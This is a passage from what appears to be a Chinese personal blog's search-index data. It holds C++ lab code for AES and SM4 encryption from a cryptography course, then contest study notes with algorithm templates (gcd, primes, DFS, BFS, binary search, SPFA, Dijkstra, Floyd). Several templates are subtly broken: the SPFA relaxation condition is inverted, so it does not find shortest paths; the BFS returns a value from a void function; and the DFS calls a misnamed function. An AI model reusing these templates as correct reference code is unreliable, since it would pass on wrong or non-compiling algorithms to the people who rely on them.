(w[0]&lt;&lt;24|w[1]&lt;&lt;16|w[2]&lt;&lt;8|w[3]);}//  S盒变换 - 前4位为行号，后4位为列号void SubBytes(uint8_t mtx[],int len){    for(int i=0; i&lt;len; ++i)    {        int row = ((mtx[i]&gt;&gt;7)&amp;0x1)*8 + ((mtx[i]&gt;&gt;6)&amp;0x1)*4 + ((mtx[i]&gt;&gt;5)&amp;0x1)*2 + ((mtx[i]&gt;&gt;4)&amp;0x1)*1;    //第4 5 6 7位确定行        int col = ((mtx[i]&gt;&gt;3)&amp;0x1)*8 + ((mtx[i]&gt;&gt;2)&amp;0x1)*4 + ((mtx[i]&gt;&gt;1)&amp;0x1)*2 + (mtx[i]&amp;0x1)*1;       //第0 1 2 3位确定列        mtx[i] = S_Box[row][col];    }}void InvSubBytes(uint8_t mtx[],int len){    for(int i=0; i&lt;len; ++i)    {        int row = ((mtx[i]&gt;&gt;7)&amp;0x1)*8 + ((mtx[i]&gt;&gt;6)&amp;0x1)*4 + ((mtx[i]&gt;&gt;5)&amp;0x1)*2 + ((mtx[i]&gt;&gt;4)&amp;0x1)*1;    //第4 5 6 7位确定行        int col = ((mtx[i]&gt;&gt;3)&amp;0x1)*8 + ((mtx[i]&gt;&gt;2)&amp;0x1)*4 + ((mtx[i]&gt;&gt;1)&amp;0x1)*2 + (mtx[i]&amp;0x1)*1;       //第0 1 2 3位确定列        mtx[i] = Inv_S_Box[row][col];    }}//行移位void ShiftRows(uint8_t mtx[]){    uint8_t temp=mtx[4];    //第二行左移一位    for(int i=0; i&lt;3; i++){        mtx[i+4] = mtx[i+5];    }    mtx[7] = temp;    //第三行左移二位    for(int i=0; i&lt;2; i++){        temp = mtx[i+8];        mtx[i+8] = mtx[i+10];        mtx[i+10] = temp;    }    //第四行左移三位    temp = mtx[15];    for(int i=3; i&gt;0; i--) {        mtx[i + 12] = mtx[i + 11];    }    mtx[12] = temp;}void InvShiftRows(uint8_t mtx[]){    // 第二行循环右移一位    uint8_t temp = mtx[7];    for(int i=3; i&gt;0; --i)        mtx[i+4] = mtx[i+3];    mtx[4] = temp;    // 第三行循环右移两位    for(int i=0; i&lt;2; ++i)    {        temp = mtx[i+8];        mtx[i+8] = mtx[i+10];        mtx[i+10] = temp;    }    // 第四行循环右移三位    temp = mtx[12];    for(int i=0; i&lt;3; ++i)        mtx[i+12] = mtx[i+13];    mtx[15] = temp;}void MixColumns(uint8_t c[]){    uint32_t total[4]={0};  //存储每一列取出的4个32比特字节异或的结果，即列混淆后的第i列    uint32_t temp[16]={0};  //存储16个 每个字节从T表得到的32比特的4字节一列    for(int i=0;i&lt;16;i++){        temp[i] = T[i/4][c[i]];    }    for(int i=0; i&lt;4;i++) {        total[i] = temp[i] ^ temp[i+4] ^ temp[i+8] ^ temp[i+12];        c[i] = (total[i]&gt;&gt;24)&amp;0xff;        c[i+4]=(total[i]&gt;&gt;16)&amp;0xff;        c[i+8] = (total[i]&gt;&gt;8)&amp;0xff;        c[i+12] = (total[i])&amp;0xff;    }}void InvMixColumns(uint8_t mtx[]){    uint8_t arr[4];    for(int i=0; i&lt;4; ++i) {        for (int j = 0; j &lt; 4; ++j)            arr[j] = mtx[i + j * 4];        mtx[i] = GFMul(0x0e, arr[0]) ^ GFMul(0x0b, arr[1]) ^ GFMul(0x0d, arr[2]) ^ GFMul(0x09, arr[3]);        mtx[i + 4] = GFMul(0x09, arr[0]) ^ GFMul(0x0e, arr[1]) ^ GFMul(0x0b, arr[2]) ^ GFMul(0x0d, arr[3]);        mtx[i + 8] = GFMul(0x0d, arr[0]) ^ GFMul(0x09, arr[1]) ^ GFMul(0x0e, arr[2]) ^ GFMul(0x0b, arr[3]);        mtx[i + 12] = GFMul(0x0b, arr[0]) ^ GFMul(0x0d, arr[1]) ^ GFMul(0x09, arr[2]) ^ GFMul(0x0e, arr[3]);    }}void Encrypt(uint8_t m[],uint32_t key[],uint8_t c[]){    //首先进行开始的轮密钥加    int round=0;    uint32_t w[4]={0};    for(int k=0; k&lt;4; k++)        w[k] = key[4*round+k];    for(int i=0; i&lt;16; i++)        c[i] = m[i];    AddRoundKey(c,w);    //接下来是9轮一摸一样的函数    for(int i = 1;i&lt;=9;i++)    {        SubBytes(c,16);//字节替代        ShiftRows(c);//行移位        MixColumns(c);//列混淆        round++;        //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;        for(int k=0; k&lt;4; k++) {            w[k] = key[4 * round + k];        }        AddRoundKey(c,w);//轮密钥加    }    //最后一轮    round++;    //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;    for(int k=0; k&lt;4; k++) {        w[k] = key[4 * round + k];        //(\"%x \",w[k]);    }    SubBytes(c,16);//字节替代    ShiftRows(c);//行移位    AddRoundKey(c,w);//轮密钥加}void Decrypt(uint8_t c[],uint32_t key[],uint8_t m[]){    //首先进行开始的轮密钥加    //注意密钥反着来    int round=10;    uint32_t w[4]={0};    for(int k=0; k&lt;4; k++)        w[k] = key[4*round+k];  //密钥赋值    for(int i=0; i&lt;16; i++)        m[i] = c[i];    AddRoundKey(m,w);    //接下来是9轮一摸一样的函数    for(int i = 1;i&lt;=9;i++)    {        InvShiftRows(m);//行移位        InvSubBytes(m,16);//字节替代        round--;        //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;        for(int k=0; k&lt;4; k++) {            w[k] = key[4 * round + k];        }        AddRoundKey(m,w);//轮密钥加        InvMixColumns(m);//列混淆    }    //最后一轮    round--;    //cout&lt;&lt;\"轮数\"&lt;&lt;round&lt;&lt;endl;    for(int k=0; k&lt;4; k++) {        w[k] = key[4 * round + k];        //(\"%x \",w[k]);    }    InvShiftRows(m);//行移位    InvSubBytes(m,16);//字节替代    AddRoundKey(m,w);//轮密钥加}void Display(uint8_t Matrix[]){    for(int i=0; i&lt;16; i++) {        printf(\"%x \", Matrix[i]);        if(i%4==3)            cout&lt;&lt;endl;    }}void DisplayKeys(uint32_t Matrix[]){    for(int i=0; i&lt;44; i++) {        printf(\"第%d列:%x\\n\",i,Matrix[i]);    }}int main(){    string mingwen;    string miwen;    uint8_t key[16]={0};    uint8_t m[16]={0};    cout&lt;&lt;\"请输入明文(128bits):\";    cin&gt;&gt;mingwen;    cout&lt;&lt;\"请输入密文(128bits):\";    cin&gt;&gt;miwen;    for(int i=0;i&lt;16;i++)    {        m[i] = (uint8_t)(mingwen[i]);        key[i] = (uint8_t)(miwen[i]);    }    uint8_t c[16]={0};    uint8_t x[16]={0};    uint32_t new_key[44]={0};   //存储44列密钥    cout&lt;&lt;\"明文:\"&lt;&lt;endl;    Display(m);    cout&lt;&lt;\"密钥:\"&lt;&lt;endl;    Display(key);    get_TAB();//生成列混淆表    KeyExpansion(key,new_key);    cout&lt;&lt;\"生成密钥\"&lt;&lt;endl;    //DisplayKeys(new_key);    Encrypt(m,new_key,c);    cout&lt;&lt;\"加密结果\"&lt;&lt;endl;    Display(c);    Decrypt(c,new_key,x);    cout&lt;&lt;\"解密结果(hex)\"&lt;&lt;endl;    Display(x);    cout&lt;&lt;\"解密结果(string)\"&lt;&lt;endl;    for(int i=0;i&lt;16;i++)        cout&lt;&lt;(char)x[i];    return 0;}\nSM4\n#include \"string.h\"#include&lt;iostream&gt;#include &lt;stdint.h&gt;#include&lt;string&gt;using namespace std;uint32_t shift_l(uint32_t s,int n)//循环左移n位{    int size=sizeof (s)*8;      //字节数乘以8代表一共多少位    return s&lt;&lt;(n)|(s&gt;&gt;size-n);}uint32_t Sb(uint32_t s) {    uint8_t SboxTable[16][16] =            {                    {0xd6, 0x90, 0xe9, 0xfe, 0xcc, 0xe1, 0x3d, 0xb7, 0x16, 0xb6, 0x14, 0xc2, 0x28, 0xfb, 0x2c, 0x05},                    {0x2b, 0x67, 0x9a, 0x76, 0x2a, 0xbe, 0x04, 0xc3, 0xaa, 0x44, 0x13, 0x26, 0x49, 0x86, 0x06, 0x99},                    {0x9c, 0x42, 0x50, 0xf4, 0x91, 0xef, 0x98, 0x7a, 0x33, 0x54, 0x0b, 0x43, 0xed, 0xcf, 0xac, 0x62},                    {0xe4, 0xb3, 0x1c, 0xa9, 0xc9, 0x08, 0xe8, 0x95, 0x80, 0xdf, 0x94, 0xfa, 0x75, 0x8f, 0x3f, 0xa6},                    {0x47, 0x07, 0xa7, 0xfc, 0xf3, 0x73, 0x17, 0xba, 0x83, 0x59, 0x3c, 0x19, 0xe6, 0x85, 0x4f, 0xa8},                    {0x68, 0x6b, 0x81, 0xb2, 0x71, 0x64, 0xda, 0x8b, 0xf8, 0xeb, 0x0f, 0x4b, 0x70, 0x56, 0x9d, 0x35},                    {0x1e, 0x24, 0x0e, 0x5e, 0x63, 0x58, 0xd1, 0xa2, 0x25, 0x22, 0x7c, 0x3b, 0x01, 0x21, 0x78, 0x87},                    {0xd4, 0x00, 0x46, 0x57, 0x9f, 0xd3, 0x27, 0x52, 0x4c, 0x36, 0x02, 0xe7, 0xa0, 0xc4, 0xc8, 0x9e},                    {0xea, 0xbf, 0x8a, 0xd2, 0x40, 0xc7, 0x38, 0xb5, 0xa3, 0xf7, 0xf2, 0xce, 0xf9, 0x61, 0x15, 0xa1},                    {0xe0, 0xae, 0x5d, 0xa4, 0x9b, 0x34, 0x1a, 0x55, 0xad, 0x93, 0x32, 0x30, 0xf5, 0x8c, 0xb1, 0xe3},                    {0x1d, 0xf6, 0xe2, 0x2e, 0x82, 0x66, 0xca, 0x60, 0xc0, 0x29, 0x23, 0xab, 0x0d, 0x53, 0x4e, 0x6f},                    {0xd5, 0xdb, 0x37, 0x45, 0xde, 0xfd, 0x8e, 0x2f, 0x03, 0xff, 0x6a, 0x72, 0x6d, 0x6c, 0x5b, 0x51},                    {0x8d, 0x1b, 0xaf, 0x92, 0xbb, 0xdd, 0xbc, 0x7f, 0x11, 0xd9, 0x5c, 0x41, 0x1f, 0x10, 0x5a, 0xd8},                    {0x0a, 0xc1, 0x31, 0x88, 0xa5, 0xcd, 0x7b, 0xbd, 0x2d, 0x74, 0xd0, 0x12, 0xb8, 0xe5, 0xb4, 0xb0},                    {0x89, 0x69, 0x97, 0x4a, 0x0c, 0x96, 0x77, 0x7e, 0x65, 0xb9, 0xf1, 0x09, 0xc5, 0x6e, 0xc6, 0x84},                    {0x18, 0xf0, 0x7d, 0xec, 0x3a, 0xdc, 0x4d, 0x20, 0x79, 0xee, 0x5f, 0x3e, 0xd7, 0xcb, 0x39, 0x48}};    uint8_t a[4];    a[0]=(s&gt;&gt;24)&amp;0xff;     //最高8位    a[1]=(s&gt;&gt;16)&amp;0xff;    a[2]=(s&gt;&gt;8)&amp;0xff;    a[3]=s&amp;0xff;    uint8_t b[4];    for(int i=0;i&lt;4;i++) {        int row = ((a[i] &gt;&gt; 7) &amp; 1) * 8 + ((a[i] &gt;&gt; 6) &amp; 1) * 4 + ((a[i] &gt;&gt; 5) &amp; 1) * 2 + ((a[i] &gt;&gt; 4) &amp; 1) * 1;        int col = ((a[i] &gt;&gt; 3) &amp; 1) * 8 + ((a[i] &gt;&gt; 2) &amp; 1) * 4 + ((a[i] &gt;&gt; 1) &amp; 1) * 2 + ((a[i]) &amp; 1) * 1;        b[i] = SboxTable[row][col];    }    uint32_t result;    result=(b[0]&lt;&lt;24)|(b[1]&lt;&lt;16)|(b[2]&lt;&lt;8)|b[3];    return result;}uint32_t L_change(uint32_t s){    return s^ shift_l(s,13)^ shift_l(s,23);}uint32_t T_change(uint32_t s){    return L_change(Sb(s));}void keyexpand(uint32_t MK[4],uint32_t rk[32]){    uint32_t FK[4]={0xA3B1BAC6, 0x56AA3350,0x677D9197, 0xB27022DC};    uint32_t CK[32] = { 0x00070E15, 0x1C232A31, 0x383F464D, 0x545B6269,                        0x70777E85, 0x8C939AA1, 0xA8AFB6BD, 0xC4CBD2D9,                        0xE0E7EEF5, 0xFC030A11, 0x181F262D, 0x343B4249,                        0x50575E65, 0x6C737A81, 0x888F969D, 0xA4ABB2B9,                        0xC0C7CED5, 0xDCE3EAF1, 0xF8FF060D, 0x141B2229,                        0x30373E45, 0x4C535A61, 0x686F767D, 0x848B9299,                        0xA0A7AEB5, 0xBCC3CAD1, 0xD8DFE6ED, 0xF4FB0209,                        0x10171E25, 0x2C333A41, 0x484F565D, 0x646B7279 };    uint32_t k[4]={MK[0]^FK[0],MK[1]^FK[1],MK[2]^FK[2],MK[3]^FK[3]};    uint32_t K[36];    for(int i=0;i&lt;=3;i++)        K[i]=k[i];    for(int i=0;i&lt;32;i++)    {        K[i+4]=K[i]^ T_change(K[i+1]^K[i+2]^K[i+3]^CK[i]);    }    for(int i=0;i&lt;32;i++)        rk[i]=K[i+4];}uint32_t Lchange(uint32_t s){    return s^shift_l(s,2)^shift_l(s,10)^shift_l(s,18)^shift_l(s,24);}uint32_t Tchange(uint32_t s){    return Lchange(Sb(s));}uint32_t fround(uint32_t X[4],uint32_t rk){    uint32_t B=X[1]^X[2]^X[3]^rk;    return X[0]^ L_change(Sb(B));}static uint32_t out1[4];void SM4(uint32_t X[4],uint32_t rk[32]){    uint32_t Y[36];    Y[0]=X[0];    Y[1]=X[1];    Y[2]=X[2];    Y[3]=X[3];    for(int i=0;i&lt;=31;i++) {        Y[i + 4] = Y[i] ^ Tchange(Y[i + 1] ^ Y[i + 2] ^ Y[i + 3] ^ rk[i]);    }//    for(int i=0;i&lt;36;i++) {//        printf(\"第%d轮:%x \\n\",i,Y[i]);//    }    out1[0]=Y[35];    out1[1]=Y[34];    out1[2]=Y[33];    out1[3]=Y[32];}static uint32_t out2[4];void sm4(uint32_t Y[4],uint32_t rk[32]){    uint32_t X[36];    X[35]=Y[0];    X[34]=Y[1];    X[33]=Y[2];    X[32]=Y[3];    for(int i=31;i&gt;=0;i--)    {        X[i]=X[i+4]^ Tchange(X[i+3]^X[i+2]^X[i+1]^rk[i]);    }    out2[0]=X[0];    out2[1]=X[1];    out2[2]=X[2];    out2[3]=X[3];}int main() {    uint32_t ming[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};    cout&lt;&lt;\"明文:\"&lt;&lt;endl;    for(int i=0;i&lt;4;i++)        cout&lt;&lt;hex&lt;&lt;ming[i]&lt;&lt;\" \";    cout&lt;&lt;endl;    uint32_t MK[4]={0x01234567,0x89ABCDEF,0xFEDCBA98,0x76543210};    cout&lt;&lt;\"密钥：\"&lt;&lt;endl;    for(int i=0;i&lt;4;i++)        cout&lt;&lt;hex&lt;&lt;MK[i]&lt;&lt;\" \";    cout&lt;&lt;endl;    uint32_t rk[32];    keyexpand(MK,rk);//    cout&lt;&lt;\"扩展密钥：\"&lt;&lt;endl;//    for(int i=0;i&lt;32;i++)//        cout&lt;&lt;i&lt;&lt;\"轮扩展密钥\"&lt;&lt;rk[i]&lt;&lt;endl;    cout&lt;&lt;\"加密结果：\"&lt;&lt;endl;    SM4(ming,rk);    for(int i=0;i&lt;4;i++)        cout&lt;&lt;out1[i]&lt;&lt;\" \";    cout&lt;&lt;endl;    cout&lt;&lt;\"解密结果:\"&lt;&lt;endl;    sm4(out1,rk);    for(int i=0;i&lt;4;i++)        cout&lt;&lt;out2[i]&lt;&lt;\" \";    cout&lt;&lt;endl;    return 0;}\n","tags":["密码学实验代码集合"]},{"title":"蓝桥杯","url":"/2023/04/09/%E8%93%9D%E6%A1%A5%E6%9D%AF%E5%88%B7%E9%A2%98%E6%80%BB%E7%BB%93/","content":"\n救赎\n基础知识\n1.欧几里得辗转相除法 求解 最大公约数 最小公倍数\nint gcd(int a, int b){return b == 0 ? a : gcd(b, a % b);}int lcm(int a, int b){return a / gcd(a, b) * b;}\n2.求质数\n/* 判断素数 */bool isPrime(LL n) {\tfor (int i = 2; i * i &lt;= n; ++i)\t\tif (n % i == 0)\t\t\treturn false;\treturn true;}\n3.栈\n#include &lt;stack&gt;stack&lt;类型&gt; mystack;s.empty();         //如果栈为空则返回true, 否则返回false;s.size();          //返回栈中元素的个数s.top();           //返回栈顶元素, 但不删除该元素s.pop();           //弹出栈顶元素, 但不返回其值s.push();          //将元素压入栈顶\n4.队列\n#include &lt;queue&gt;queue&lt;类型&gt; myqueue;push() //在队尾插入一个元素pop() //删除队列第一个元素size() //返回队列中元素个数empty() //如果队列空则返回truefront() //返回队列中的第一个元素back() //返回队列中最后一个元素\n5.DFS(深度优先)\nint dx[4] = {0,0,-1,1};int dy[4] = {-1,1,0,0};int mp[N][N];//存放迷宫int vis[N][N];//表示是否访问过，初始为flasevoid DFS(int x, int y)\t//x,y是坐标点的位置 {\tif(vis[x][y] || (x==n &amp;&amp; y==n)) return; //表示已经访问过了或者到达终点,递归的出口\tvis[x][y] = true; //表示没有访问过，现在正在访问，置为访问过\tfor(int i=0; i &lt; 4; i++){\t//遍历四个方向，顺序依次是，上下左右\t\tint nx = x + dx[i];\t\tint ny = y + dy[i];      //进行了合法性检验，      //1.首先判断了该点是否越界，即是否在迷宫内  nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n      //2.然后判断是否访问过  !vis[nx][ny] 未访问过就继续      //3.最后判断是否为路  mp[nx][ny] == '0' 为路就继续\t\tif(nx &gt; 0 &amp;&amp; nx &lt;= n &amp;&amp; ny &gt; 0 &amp;&amp; ny &lt;= n &amp;&amp; !vis[nx][ny] &amp;&amp; mp[nx][ny] == '0')\t\t\tdfs(nx,ny);\t} }//注意!! 应该判断一下起点是否可走\n6.BFS(广度优先搜索)\nint X[4]={0, 0, -1, 1};int Y[4]={-1, 1, 0, 0};int matrix[N][N]; //存储迷宫信息int vis[N][N];\t//存储每个状态点是否走过struct node{\tint x;\tint y;}Node, top;bool judge(int xx, int yy){\tif(xx&lt;0||yy&lt;0||xx&gt;=N||yy&gt;=N) //注意边界\t\treturn false;\tif(vis[xx][yy]==true||matrix[xx][yy]==0)\t//下一个点走过或者为墙 0不能走，1能走\t\treturn false;\treturn true;}void BFS(int x, int y){\tqueue&lt;node&gt; q;\tNode.x=x;\tNode.y=y;\tq.push(Node);\t//将起点入队列\twhile(!q.empty())\t//队列不空就扩散\t{\t\ttop=q.front();\t//取出队首元素\t\tint nx=top.x;\t\tint ny=top.y;\t//从四个方面机进行扩散         if(nx == ex &amp;&amp; ny == ey) //找到终点             return top;\t\tfor(int i=0; i&lt;4; i++)\t\t{\t\t\tif(judge(nx+X[i], ny+Y[i])) //检查四个方向，如果有路就进队列\t\t\t{\t\t\t\tNode.x=nx+X[i];\t\t\t\tNode.y=ny+Y[i];\t\t\t\tq.push(Node);\t\t\t\t}\t\t}\t\tans++;\t//计数器\t\tvis[nx][ny]=true;\t\tq.pop();\t//表示这个点的邻接点已经全部入队列，丢弃这个点\t}}\n7.二分模板\n/*    作者:FengBOOOOOOOOOOOOOOO    二分模板返回大于x的第一个位置    */#include&lt;cstdio&gt;#include&lt;algorithm&gt;#include&lt;cstring&gt;#define N 1005using namespace std;int a[N],n,q;int find(int l,int r,int key)//l为-1，r为数组长度{    while(l + 1 &lt; r)    {        int mid = l + r&gt;&gt;1;        if(a[mid] &lt;= key)        　　l = mid;        else        　　r = mid;    }    return r;//返回大于Key的第一个位置}int main(){    int k;    scanf(\"%d%d\",&amp;n,&amp;q);    for(int i = 0; i &lt; n; ++i)    　　scanf(\"%d\",&amp;a[i]);    for(int i = 0; i &lt; q; ++i)    {        scanf(\"%d\",&amp;k);        printf(\"%d\\n\",find(-1,n,k));    }} \n最短路径问题\n1.SPFA最短路径(类似与BFS)\n#include &lt;iostream&gt;#include &lt;string.h&gt;#include &lt;stdio.h&gt;#include &lt;algorithm&gt;#include &lt;queue&gt;#include &lt;vector&gt;#define ll long long#define inf 0x3f3f3f3f#define pii pair&lt;int, int&gt;const int mod = 1e9+7;const int maxn = 2e5+7;using namespace std;struct node {int to,w,next;} edge[maxn];int head[maxn], cnt;int dis[maxn], vis[maxn];int n, m, s, t;struct Spfa{    void init()    {        memset(head,-1,sizeof(head));        memset(dis,0x3f3f3f3f,sizeof(dis));        memset(vis,0,sizeof(vis));        cnt = 0;    }     void add(int u,int v,int w)    {        edge[cnt].to = v;        edge[cnt].w = w;        edge[cnt].next = head[u];        head[u] = cnt ++;    }     void spfa()    {        dis[s] = 0; vis[s] = 1;        queue &lt;int&gt; Q; Q.push(s);        while(!Q.empty())        {            int now = Q.front();            Q.pop(); vis[now] = 0;    //从队列中弹出now , vis[now] 标记为未访问            for(int i = head[now]; i != -1; i = edge[i].next)            {                int v = edge[i].to;                if(dis[v] &lt; dis[now] + edge[i].w)                {                    dis[v] = dis[now] + edge[i].w;                    if(vis[v]) continue;    //如果访问过了(也就是 已经在队列中),就不用再push                    vis[v] = 1; Q.push(v);                }            }        }    }}sp; int main(){    while(~scanf(\"%d%d\",&amp;n,&amp;m) &amp;&amp; n+m)    {        sp.init();        for(int i = 0; i &lt; m; i++)        {            int u, v, w;            scanf(\"%d%d%d\",&amp;u, &amp;v, &amp;w);            sp.add(u, v, w);            sp.add(v, u, w);        }        s = 1, t = n; //s起点，t终点        sp.spfa();        printf(\"%d\\n\", dis[t]);    }}\n2.Dijkstra\n//主要思想一个大循环+两个小循环void dijkstra(){\tint u, minx;\tbook[S] = 1;\tfor(int i = 0; i &lt; N; i++){\t//dist[]数组初始化，把起始结点S到i结点的距离赋值给diat[i]\t\tdist[i] = v[S][i];\t}\tfor(int i = 0; i &lt; N; i++){//大循环\t\tminx = INT_MAX;\t\tfor(int j = 0; j &lt; N; j++){//寻找没有被标记并且最短的路径，并记录此结点 \t\t\tif(!book[j] &amp;&amp; minx &gt; dist[j]){\t\t\t\tminx = dist[j];\t\t\t\tu = j;\t\t\t} \t\t}\t\tbook[u] = 1;\t\tfor(int k = 0; k &lt; N; k++){\t\t//如果A到B的距离大于A到C的距离加C到B的距离，那么更新数据\t\t\tif(!book[k] &amp;&amp; dist[k] &gt; dist[u]+v[u][k]){\t\t\t\tdist[k] = dist[u]+v[u][k];\t\t\t}\t\t}\t}}\n3.Floyd\n//初始化：    for (int i = 1; i &lt;= n; i ++ )        for (int j = 1; j &lt;= n; j ++ )            if (i == j) d[i][j] = 0;            else d[i][j] = INF;// 算法结束后，d[a][b]表示a到b的最短距离void floyd(){    for (int k = 1; k &lt;= n; k ++ )        for (int i = 1; i &lt;= n; i ++ )            for (int j = 1; j &lt;= n; j ++ )                d[i][j] = min(d[i][j], d[i][k] + d[k][j]);}\n","tags":["蓝桥杯刷题总结"]}]